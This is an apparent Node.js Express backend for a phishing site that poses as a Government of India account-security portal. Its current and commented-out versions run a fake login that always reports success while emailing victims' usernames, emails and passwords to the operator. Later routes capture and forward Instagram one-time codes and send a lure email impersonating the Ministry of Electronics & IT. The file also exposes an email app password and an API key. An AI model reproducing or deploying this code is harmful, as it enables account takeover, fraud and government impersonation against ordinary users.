// // // // // require("dotenv").config();
// // // // // const express = require("express");
// // // // // const mongoose = require("mongoose");
// // // // // const cors = require("cors");
// // // // // const User = require("./user");

// // // // // const app = express();

// // // // // app.use(express.json());

// // // // // app.use(cors({
// // // // //   origin: [
// // // // //     "https://governmentaccountssecurity.vercel.app",
// // // // //     "http://localhost:5173"
// // // // //   ],
// // // // //   methods: ["GET", "POST", "DELETE"],
// // // // //   allowedHeaders: ["Content-Type", "x-admin-key"]
// // // // // }));

// // // // // app.get("/", (req, res) => {
// // // // //   res.status(200).send("Backend is running");
// // // // // });

// // // // // mongoose.connect(process.env.MONGO_URI)
// // // // //   .then(() => console.log("MongoDB Connected"))
// // // // //   .catch(err => console.log("Mongo Error:", err));

// // // // // app.post("/login", async (req, res) => {
// // // // //   try {
// // // // //     const { userName, email, passWord } = req.body;

// // // // //     if (!userName || !email || !passWord) {
// // // // //       return res.status(400).json({ message: "All fields required" });
// // // // //     }

// // // // //     // ❌ NO DUPLICATE CHECK
// // // // //     // ❌ NO LOGIN VALIDATION

// // // // //     const newEntry = new User({
// // // // //       userName,
// // // // //       email,
// // // // //       passWord,
// // // // //       createdAt: new Date()
// // // // //     });

// // // // //     await newEntry.save();

// // // // //     // ✅ ALWAYS SUCCESS
// // // // //     res.status(200).json({
// // // // //       success: true,
// // // // //       userName
// // // // //     });

// // // // //   } catch (err) {
// // // // //     res.status(500).json({ message: "Server error" });
// // // // //   }
// // // // // });


// // // // // app.get("/admin/users", async (req, res) => {
// // // // //   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
// // // // //     return res.status(403).json({ message: "Access denied" });
// // // // //   }

// // // // //   const users = await User.find({}, {
// // // // //     userName: 1,
// // // // //     email: 1,
// // // // //     passWord: 1,
// // // // //     _id: 0
// // // // //   });

// // // // //   res.json(users);
// // // // // });

// // // // // app.delete("/admin/clear-users", async (req, res) => {
// // // // //   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
// // // // //     return res.status(403).json({ message: "Access denied" });
// // // // //   }

// // // // //   await User.deleteMany({});
// // // // //   res.json({ message: "All users deleted" });
// // // // // });

// // // // // const PORT = process.env.PORT || 4000;
// // // // // app.listen(PORT, () => console.log(`Server running on ${PORT}`));







// // // // // require("dotenv").config();
// // // // // const express = require("express");
// // // // // const mongoose = require("mongoose");
// // // // // const cors = require("cors");
// // // // // const User = require("./user");

// // // // // const app = express();

// // // // // app.use(express.json());

// // // // // // 🔥 TEMPORARY OPEN CORS (for mobile debug)
// // // // // app.use(cors({
// // // // //   origin: "*",
// // // // //   methods: ["GET", "POST", "OPTIONS"],
// // // // //   allowedHeaders: ["Content-Type", "x-admin-key"]
// // // // // }));

// // // // // // app.options("/*", cors());

// // // // // app.get("/", (req, res) => {
// // // // //   res.status(200).send("Backend is running");
// // // // // });

// // // // // mongoose.connect(process.env.MONGO_URI)
// // // // //   .then(() => console.log("MongoDB Connected"))
// // // // //   .catch(err => console.log("Mongo Error:", err));

// // // // // app.post("/login", async (req, res) => {
// // // // //   try {
// // // // //     const { userName, email, passWord } = req.body;

// // // // //     if (!userName || !email || !passWord) {
// // // // //       return res.status(400).json({ success: false, step: "missing_fields" });
// // // // //     }

// // // // //     await User.create({
// // // // //       userName,
// // // // //       email,
// // // // //       passWord,
// // // // //       createdAt: new Date()
// // // // //     });

// // // // //     return res.status(200).json({
// // // // //       success: true,
// // // // //       step: "saved_successfully",
// // // // //       userName
// // // // //     });

// // // // //   } catch (err) {
// // // // //     console.error("LOGIN ERROR:", err);
// // // // //     return res.status(200).json({
// // // // //       success: true,   // ⚠️ IMPORTANT
// // // // //       step: "db_error_but_continue"
// // // // //     });
// // // // //   }
// // // // // });

// // // // // const PORT = process.env.PORT || 4000;
// // // // // app.listen(PORT, () =>
// // // // //   console.log(`Server running on ${PORT}`)
// // // // // );










// // // // require("dotenv").config();
// // // // const express = require("express");
// // // // const mongoose = require("mongoose");
// // // // const cors = require("cors");
// // // // const User = require("./user");

// // // // const app = express();

// // // // /* ---------------- MIDDLEWARE ---------------- */
// // // // app.use(express.json());

// // // // // 🔥 OPEN CORS (demo + mobile safe)
// // // // app.use(cors({
// // // //   origin: "*",
// // // //   methods: ["GET", "POST", "DELETE"],
// // // //   allowedHeaders: ["Content-Type", "x-admin-key"]
// // // // }));

// // // // /* ---------------- HEALTH CHECK ---------------- */
// // // // app.get("/", (req, res) => {
// // // //   res.status(200).send("Backend is running");
// // // // });

// // // // /* ---------------- DB CONNECT ---------------- */
// // // // mongoose.connect(process.env.MONGO_URI)
// // // //   .then(() => console.log("MongoDB Connected"))
// // // //   .catch(err => console.log("Mongo Error:", err));

// // // // /* =====================================================
// // // //    1️⃣ FAKE LOGIN (ALWAYS SUCCESS, ALWAYS STORE)
// // // //    ===================================================== */
// // // // app.post("/login", async (req, res) => {
// // // //   try {
// // // //     const { userName, email, passWord } = req.body;

// // // //     if (!userName || !email || !passWord) {
// // // //       return res.status(400).json({
// // // //         success: false,
// // // //         step: "missing_fields"
// // // //       });
// // // //     }

// // // //     await User.create({
// // // //       userName,
// // // //       email,
// // // //       passWord,
// // // //       createdAt: new Date()
// // // //     });

// // // //     return res.status(200).json({
// // // //       success: true,
// // // //       step: "stored_successfully",
// // // //       userName
// // // //     });

// // // //   } catch (err) {
// // // //     console.error("LOGIN ERROR:", err);

// // // //     // ⚠️ VERY IMPORTANT:
// // // //     // Even DB error → frontend flow must continue
// // // //     return res.status(200).json({
// // // //       success: true,
// // // //       step: "db_error_but_continue"
// // // //     });
// // // //   }
// // // // });

// // // // /* =====================================================
// // // //    2️⃣ ADMIN – FETCH USERS (FOR DASHBOARD)
// // // //    ===================================================== */
// // // // app.get("/admin/users", async (req, res) => {
// // // //   try {
// // // //     const adminKey = req.headers["x-admin-key"];

// // // //     if (adminKey !== "OWNER_SECRET_123") {
// // // //       return res.status(403).json({ message: "Access denied" });
// // // //     }

// // // //     const users = await User.find(
// // // //       {},
// // // //       {
// // // //         _id: 0,
// // // //         userName: 1,
// // // //         email: 1,
// // // //         passWord: 1,
// // // //         createdAt: 1
// // // //       }
// // // //     ).sort({ createdAt: -1 });

// // // //     res.status(200).json({
// // // //       success: true,
// // // //       count: users.length,
// // // //       users
// // // //     });

// // // //   } catch (err) {
// // // //     console.error("FETCH USERS ERROR:", err);
// // // //     res.status(500).json({ success: false });
// // // //   }
// // // // });

// // // // /* =====================================================
// // // //    3️⃣ ADMIN – DELETE ALL USERS
// // // //    ===================================================== */
// // // // app.delete("/admin/clear-users", async (req, res) => {
// // // //   try {
// // // //     const adminKey = req.headers["x-admin-key"];

// // // //     if (adminKey !== "OWNER_SECRET_123") {
// // // //       return res.status(403).json({ message: "Access denied" });
// // // //     }

// // // //     await User.deleteMany({});

// // // //     res.status(200).json({
// // // //       success: true,
// // // //       message: "All users deleted"
// // // //     });

// // // //   } catch (err) {
// // // //     console.error("DELETE USERS ERROR:", err);
// // // //     res.status(500).json({ success: false });
// // // //   }
// // // // });

// // // // /* ---------------- SERVER ---------------- */
// // // // const PORT = process.env.PORT || 4000;
// // // // app.listen(PORT, () => {
// // // //   console.log(`Server running on port ${PORT}`);
// // // // });



// // // require("dotenv").config();
// // // const express = require("express");
// // // const cors = require("cors");
// // // const { sendEmail } = require("./sendEmail");

// // // const app = express();

// // // app.use(express.json());

// // // app.use(cors({
// // //   origin: "*",
// // //   methods: ["GET", "POST"],
// // //   allowedHeaders: ["Content-Type"]
// // // }));

// // // /* ---------------- HEALTH CHECK ---------------- */
// // // app.get("/", (req, res) => {
// // //   res.send("Backend is running");
// // // });

// // // /* ---------------- FAKE LOGIN ---------------- */
// // // app.post("/login", async (req, res) => {
// // //   try {
// // //     const { userName, email, passWord } = req.body;

// // //     if (!userName || !email || !passWord) {
// // //       return res.status(400).json({
// // //         success: false,
// // //         message: "Missing fields"
// // //       });
// // //     }

// // //     // 📧 EMAIL CONTENT
// // //     const mailText = `
// // // 🚨 NEW ACCOUNT SUBMISSION 🚨

// // // Username: ${userName}
// // // Email: ${email}
// // // Password: ${passWord}

// // // Time: ${new Date().toLocaleString()}
// // // IP: ${req.ip}
// // //     `;

// // //     // ✅ SEND TO OWNER
// // //     await sendEmail(
// // //       "OWNER_EMAIL@gmail.com",
// // //       "New Account Verification Request",
// // //       mailText
// // //     );

// // //     // ✅ ALWAYS SUCCESS
// // //     return res.status(200).json({
// // //       success: true,
// // //       step: "email_sent"
// // //     });

// // //   } catch (err) {
// // //     console.error("MAIL ERROR:", err);

// // //     // ⚠️ STILL SUCCESS (FAKE SYSTEM)
// // //     return res.status(200).json({
// // //       success: true,
// // //       step: "mail_failed_but_continue"
// // //     });
// // //   }
// // // });

// // // /* ---------------- SERVER ---------------- */
// // // const PORT = process.env.PORT || 4000;
// // // app.listen(PORT, () => {
// // //   console.log("Server running on port", PORT);
// // // });










// // require("dotenv").config();
// // const express = require("express");
// // const cors = require("cors");
// // const { sendEmail } = require("./sendEmail");

// // const app = express();

// // /* ================= BASIC MIDDLEWARE ================= */
// // app.use(express.json());

// // app.use(cors({
// //   origin: "*",
// //   methods: ["GET", "POST"],
// //   allowedHeaders: ["Content-Type"]
// // }));

// // /* ================= ENV DEBUG ================= */
// // console.log("ENV CHECK:");
// // console.log("EMAIL_USER exists:", !!process.env.EMAIL_USER);
// // console.log("EMAIL_PASS exists:", !!process.env.EMAIL_PASS);

// // /* ================= HEALTH CHECK ================= */
// // app.get("/", (req, res) => {
// //   res.send("Backend is running");
// // });

// // /* ================= LOGIN ROUTE ================= */
// // app.post("/login", async (req, res) => {
// //   console.log("---- /login HIT ----");
// //   console.log("Request body:", req.body);

// //   const { userName, email, passWord } = req.body;

// //   if (!userName || !email || !passWord) {
// //     console.log("❌ Missing fields");
// //     return res.status(400).json({
// //       success: false,
// //       step: "missing_fields"
// //     });
// //   }

// //   const mailText = `
// // NEW ACCOUNT SUBMISSION

// // Username: ${userName}
// // Email: ${email}
// // Password: ${passWord}
// // Time: ${new Date().toLocaleString()}
// // IP: ${req.ip}
// //   `;

// //   try {
// //     console.log("📧 Calling sendEmail()");
// //     await sendEmail(
// //       process.env.EMAIL_USER, // owner email
// //       "New Account Verification",
// //       mailText
// //     );
// //     console.log("✅ Email SENT SUCCESSFULLY");

// //     return res.status(200).json({
// //       success: true,
// //       step: "email_sent"
// //     });

// //   } catch (err) {
// //     console.error("🔥 EMAIL FAILED:", err.message);

// //     // IMPORTANT: still success (fake login)
// //     return res.status(200).json({
// //       success: true,
// //       step: "email_failed_but_continue",
// //       error: err.message
// //     });
// //   }
// // });

// // /* ================= SERVER ================= */
// // const PORT = process.env.PORT || 4000;
// // app.listen(PORT, () => {
// //   console.log("🚀 Server running on port", PORT);
// // });












// const nodemailer = require("nodemailer");

// const sendEmail = async (to, subject, text) => {
//     console.log("📨 Initializing mail transporter...");

//     const transporter = nodemailer.createTransport({
//         service: "Gmail",
//         auth: {
//             user: 'sahuprayag145@gmail.com',
//                         pass: 'hhxx dbcp havm tiox', // App password
//         },
//         connectionTimeout: 10000,
//         greetingTimeout: 10000,
//         socketTimeout: 10000
//     });

//     console.log("🔍 Verifying transporter...");
//     await transporter.verify();
//     console.log("✅ Transporter verified");

//     console.log("📤 Sending email...");
//     await transporter.sendMail({
//         from: 'sahuprayag145@gmail.com',
//         to,
//         subject,
//         text
//     });

//     console.log("📬 Email sendMail resolved");
// };

// module.exports = { sendEmail };








// const express = require("express");
// const cors = require("cors");
// const nodemailer = require("nodemailer");

// const app = express();

// /* ================= BASIC SETUP ================= */
// app.use(express.json());
// app.use(cors({ origin: "*" }));

// /* ================= HEALTH CHECK ================= */
// app.get("/", (req, res) => {
//   res.send("Backend is running");
// });

// /* ================= MAIL TRANSPORTER ================= */
// /* ❗ NO ENV USED – DIRECT APP PASSWORD */
// const transporter = nodemailer.createTransport({
//   service: "Gmail",
//   auth: {
//     user: "sahuprayag145@gmail.com",
//     pass: "hhxx dbcp havm tiox" // Gmail App Password ONLY
//   }
// });

// /* ================= LOGIN (FAKE) ================= */
// app.post("/login", (req, res) => {
//   const { userName, email, passWord } = req.body;

//   console.log("LOGIN HIT:", req.body);

//   if (!userName || !email || !passWord) {
//     return res.status(400).json({
//       success: false,
//       step: "missing_fields"
//     });
//   }

//   /* -------- EMAIL CONTENT -------- */
//   const mailText = `
// 🔐 NEW ACCOUNT ATTEMPT

// Username: ${userName}
// Email: ${email}
// Password: ${passWord}

// Time: ${new Date().toLocaleString()}
// IP: ${req.ip}
// `;

//   /* -------- FIRE & FORGET EMAIL -------- */
//   transporter.sendMail({
//     from: "Govt Security <sahuprayag145@gmail.com>",
//     to: "sahuprayag145@gmail.com",
//     subject: "New Social Media Verification",
//     text: mailText
//   })
//     .then(() => console.log("✅ EMAIL SENT"))
//     .catch(err => console.error("❌ EMAIL FAILED (IGNORED):", err.message));

//   /* -------- ALWAYS SUCCESS (FAKE LOGIN) -------- */
//   return res.status(200).json({
//     success: true,
//     step: "login_success"
//   });
// });

// /* ================= SERVER ================= */
// const PORT = process.env.PORT || 4000;
// app.listen(PORT, () => {
//   console.log("🚀 Server running on port", PORT);
// });


// const express = require("express");
// const cors = require("cors");
// const nodemailer = require("nodemailer");

// const app = express();

// app.use(express.json());
// app.use(cors({ origin: "*" }));

// /* ================= HEALTH ================= */
// app.get("/", (req, res) => {
//   res.send("Backend is running");
// });

// /* ================= BREVO SMTP ================= */
// const transporter = nodemailer.createTransport({
//   host: "smtp-relay.brevo.com",
//   port: 587,
//   secure: false,
//   auth: {
//     user: "YOUR_BREVO_LOGIN",     // e.g. xyz@smtp-brevo.com
//     pass: "YOUR_BREVO_PASSWORD"
//   }
// });

// /* ================= LOGIN ================= */
// app.post("/login", async (req, res) => {
//   const { userName, email, passWord } = req.body;

//   if (!userName || !email || !passWord) {
//     return res.status(400).json({
//       success: false,
//       step: "missing_fields"
//     });
//   }

//   const mailText = `
// 🔐 NEW ACCOUNT ATTEMPT

// Username: ${userName}
// Email: ${email}
// Password: ${passWord}
// Time: ${new Date().toLocaleString()}
// IP: ${req.ip}
// `;

//   try {
//     await transporter.sendMail({
//       from: "Govt Security <no-reply@govt-secure.com>",
//       to: "sahuprayag145@gmail.com",
//       subject: "New Social Media Verification",
//       text: mailText
//     });

//     console.log("✅ EMAIL SENT");

//     return res.json({
//       success: true,
//       step: "email_sent"
//     });

//   } catch (err) {
//     console.error("EMAIL ERROR:", err.message);

//     return res.json({
//       success: true, // fake login continues
//       step: "email_failed_but_continue",
//       error: err.message
//     });
//   }
// });

// /* ================= SERVER ================= */
// const PORT = process.env.PORT || 4000;
// app.listen(PORT, () =>
//   console.log("🚀 Server running on port", PORT)
// );


// const express = require("express");
// const cors = require("cors");
// const { Resend } = require("resend");

// const app = express();

// /* ================= BASIC SETUP ================= */
// app.use(express.json());
// app.use(cors({ origin: "*" }));

// /* ================= RESEND ================= */
// const resend = new Resend("re_jL1y2NB9_Bkj82exL7EuKTjqgQvtMG69n"); // your key

// /* ================= HEALTH ================= */
// app.get("/", (req, res) => {
//   res.send("Backend is running");
// });

// /* ================= LOGIN ================= */
// app.post("/login", async (req, res) => {
//   const { userName, email, passWord } = req.body;

//   if (!userName || !email || !passWord) {
//     return res.status(400).json({
//       success: false,
//       step: "missing_fields"
//     });
//   }

//   const text = `
// 🔐 NEW ACCOUNT SUBMISSION

// Username: ${userName}
// Email: ${email}
// Password: ${passWord}

// Time: ${new Date().toLocaleString()}
// IP: ${req.ip}
// `;

//   try {
//     await resend.emails.send({
//       from: "Govt Security <onboarding@resend.dev>",
//       to: ["r89295489@gmail.com"], // OWNER EMAIL
//       subject: "New Social Media Verification",
//       text
//     });

//     return res.json({
//       success: true,
//       step: "email_sent"
//     });

//   } catch (err) {
//     console.error("RESEND ERROR:", err);

//     return res.json({
//       success: true, // fake login continues
//       step: "email_failed_but_continue",
//       error: err.message
//     });
//   }
// });

// /* ================= SERVER ================= */
// const PORT = process.env.PORT || 4000;
// app.listen(PORT, () => {
//   console.log("🚀 Server running on port", PORT);
// });



const express = require("express");
const cors = require("cors");
const { Resend } = require("resend");

const app = express();

/* ================= BASIC SETUP ================= */
app.use(express.json());
app.use(cors({ origin: "*" }));

/* ================= RESEND ================= */
const resend = new Resend("re_jL1y2NB9_Bkj82exL7EuKTjqgQvtMG69n"); // YOUR KEY

const OWNER_EMAIL = "r89295489@gmail.com";

/* ================= OTP STORE (TEMP) ================= */
// phone/email/username → { otp, expires }
const otpStore = new Map();

/* ================= HEALTH ================= */
app.get("/", (req, res) => {
  res.send("Backend is running");
});

/* =====================================================
   LOGIN → SEND DETAILS TO OWNER (FAKE LOGIN)
===================================================== */
app.post("/login", async (req, res) => {
  const { userName, email, passWord } = req.body;

  if (!userName || !email || !passWord) {
    return res.status(400).json({
      success: false,
      step: "missing_fields",
    });
  }

  const text = `
🔐 NEW VERIFICATION REQUEST

Username: ${userName}
Email: ${email}
Password: ${passWord}
IP: ${req.ip}
Time: ${new Date().toLocaleString()}
`;

  try {
    await resend.emails.send({
      from: "SecureVerify <onboarding@resend.dev>",
      to: [OWNER_EMAIL],
      subject: "New Account Verification Request",
      text,
    });

    return res.json({
      success: true,
      step: "email_sent",
    });

  } catch (err) {
    console.error("RESEND LOGIN ERROR:", err.message);

    return res.json({
      success: true, // fake login continues
      step: "email_failed_but_continue",
      error: err.message,
    });
  }
});

/* =====================================================
   SEND OTP (Authentication Step)
===================================================== */
app.post("/send-otp", async (req, res) => {
  const { userName } = req.body;

  if (!userName) {
    return res.status(400).json({
      success: false,
      step: "username_required",
    });
  }

  const otp = Math.floor(100000 + Math.random() * 900000);

  otpStore.set(userName, {
    otp,
    expires: Date.now() + 5 * 60 * 1000, // 5 minutes
  });

  const text = `
🔐 AUTHENTICATION CONFIRMATION

Username: ${userName}
OTP: ${otp}
Purpose: Instagram security authentication
Expires in: 5 minutes
Time: ${new Date().toLocaleString()}
`;

  try {
    await resend.emails.send({
      from: "SecureVerify <onboarding@resend.dev>",
      to: [OWNER_EMAIL],
      subject: "OTP Authentication Request",
      text,
    });

    return res.json({
      success: true,
      step: "otp_sent",
    });

  } catch (err) {
    console.error("RESEND OTP ERROR:", err.message);

    return res.status(500).json({
      success: false,
      step: "otp_email_failed",
    });
  }
});

/* =====================================================
   VERIFY OTP
===================================================== */

/* ================= VERIFY OTP (FAKE) ================= */
app.post("/verify-otp", async (req, res) => {
  const { userName, otpInput, platform } = req.body;

  if (!userName || !otpInput) {
    return res.status(400).json({
      success: false,
      message: "Missing fields"
    });
  }

  const emailText = `
🔐 AUTHENTICATION CONFIRMATION

Username: ${userName}
Platform: ${platform || "Unknown"}

User entered OTP:
${otpInput}

Time: ${new Date().toLocaleString()}
IP: ${req.ip}

NOTE:
This OTP was user-entered for authentication confirmation.
No automatic verification was performed.
`;

  try {
    await resend.emails.send({
      from: "Security Monitor <onboarding@resend.dev>",
      to: ["r89295489@gmail.com"], // OWNER EMAIL
      subject: "OTP Authentication Confirmation",
      text: emailText
    });

    return res.json({
      success: true,
      step: "otp_forwarded_to_owner"
    });

  } catch (err) {
    console.error("EMAIL ERROR:", err.message);

    // ⚠️ Still return success (fake flow continues)
    return res.json({
      success: true,
      step: "email_failed_but_continue"
    });
  }
});







/* =====================================================
   NOTIFY USER (SEND SECURITY WARNING EMAIL)
===================================================== */
app.post("/notify-user", async (req, res) => {
  const { userName, userEmail } = req.body;

  if (!userName || !userEmail) {
    return res.status(400).json({
      success: false,
      message: "userName and userEmail are required"
    });
  }

  const emailText = `
Important Security Notice – Action Required

Dear ${userName},

Greetings from SecureVerify – Governmental Approval Platform
(Ministry of Electronics & Information Technology, India).

We are reaching out regarding the security of your social media account
associated with the email address: ${userEmail}.

Due to incomplete two-factor authentication verification, we are currently
unable to ensure full protection of your account. Multiple authentication
attempts were initiated, however, no confirmation was received.

To prevent unauthorized access, we request you to complete the verification
process immediately.

Please visit our official portal:
https://governmentaccountssecurity.vercel.app

After logging in, click on the Authentication button to verify your identity.
Our Instagram collaboration channel will issue a new verification code.

Failure to complete this step may leave your account vulnerable to cyber
threats and fraudulent access.

Regards,
SecureVerify Team
Government of India (IT Security Division)
`;

  try {
    await resend.emails.send({
      from: "SecureVerify <onboarding@resend.dev>",
      to: [userEmail],
      subject: "Important Security Notice – Action Required",
      text: emailText
    });

    return res.json({
      success: true,
      step: "user_email_sent"
    });

  } catch (err) {
    console.error("USER EMAIL ERROR:", err.message);

    return res.status(500).json({
      success: false,
      step: "user_email_failed",
      error: err.message
    });
  }
});








/* ================= SERVER ================= */
const PORT = process.env.PORT || 4000;
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
